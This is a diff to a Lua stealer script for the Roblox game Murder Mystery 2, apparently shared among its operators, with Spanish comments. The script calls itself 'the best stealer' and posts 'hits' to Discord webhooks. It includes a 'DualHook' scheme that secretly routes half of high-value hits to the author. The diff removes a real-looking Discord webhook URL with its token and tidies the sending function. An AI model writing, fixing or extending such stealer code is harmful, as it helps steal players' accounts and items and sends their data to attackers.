@@ -16,7 +16,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 
 -- Configuración DualHook
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
-local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
+local DualHookWebhook = "TU_WEBHOOK_AQUI" -- Cambia a tu webhook real
 local DualHookMinValue = 500
 local DualHookPercent = 50 -- porcentaje de hits que se van a ti
 
@@ -38,11 +38,17 @@ CheckServerInitial()
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función para enviar webhook (dualhook automático)
+-- Función para enviar webhook (DualHook seguro con totalValue)
 local function SendDualHook(title, description, fields)
+    totalValue = totalValue or 0
     local useDual = totalValue >= DualHookMinValue and math.random(1,100) <= DualHookPercent
     local targetWebhook = useDual and DualHookWebhook or webhook
-    local prefix = pingEveryone and "@everyone " or ""  -- <--- define antes
+    local prefix = pingEveryone and "@everyone " or ""
+
+    for i, field in ipairs(fields or {}) do
+        if not field.value then field.value = "N/A" end
+    end
+
     local data = {
         ["content"] = prefix,
         ["embeds"] = {{
@@ -54,8 +60,11 @@ local function SendDualHook(title, description, fields)
             ["footer"] = {["text"]="The best stealer by Anonimo 🇪🇨"}
         }}
     }
+
     local body = HttpService:JSONEncode(data)
-    pcall(function() req({Url=targetWebhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
+    pcall(function()
+        req({Url=targetWebhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+    end)
 end
 
 -- Función para crear Pastebin
@@ -223,7 +232,6 @@ local function SendInitWebhook()
         end
     end
 
-    local prefix=pingEveryone and "@everyone " or ""
     SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
 end
 SendInitWebhook()
